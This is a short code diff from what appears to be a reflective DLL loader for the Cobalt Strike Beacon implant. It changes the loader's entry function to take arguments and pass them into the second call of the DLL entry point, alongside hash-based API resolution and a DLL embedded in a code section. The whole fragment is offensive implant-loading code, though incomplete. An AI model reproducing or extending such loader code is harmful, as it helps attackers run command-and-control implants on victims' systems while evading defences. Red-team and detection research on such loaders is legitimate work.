@@ -10,7 +10,7 @@ char _DLL_ [0] __attribute__ ( ( section ( "dll" ) ) );
 /* Macro to get Pointer to resource */
 #define GETRESOURCE(x) ( char * ) &x
 
-void go ( )
+void go ( void * loader_arguments )
 {
 	/* populate funcs */
 	IMPORTFUNCS funcs;
@@ -38,7 +38,7 @@ void go ( )
 
 	/* call it twice for Beacon */
 	entry_point ( ( HINSTANCE ) dll_dst, DLL_PROCESS_ATTACH, NULL );
-	entry_point ( ( HINSTANCE ) ( char * ) go, 0x4, NULL );
+	entry_point ( ( HINSTANCE ) ( char * ) go, 0x4, loader_arguments );
 }
 
 FARPROC resolve ( DWORD mod_hash, DWORD func_hash )
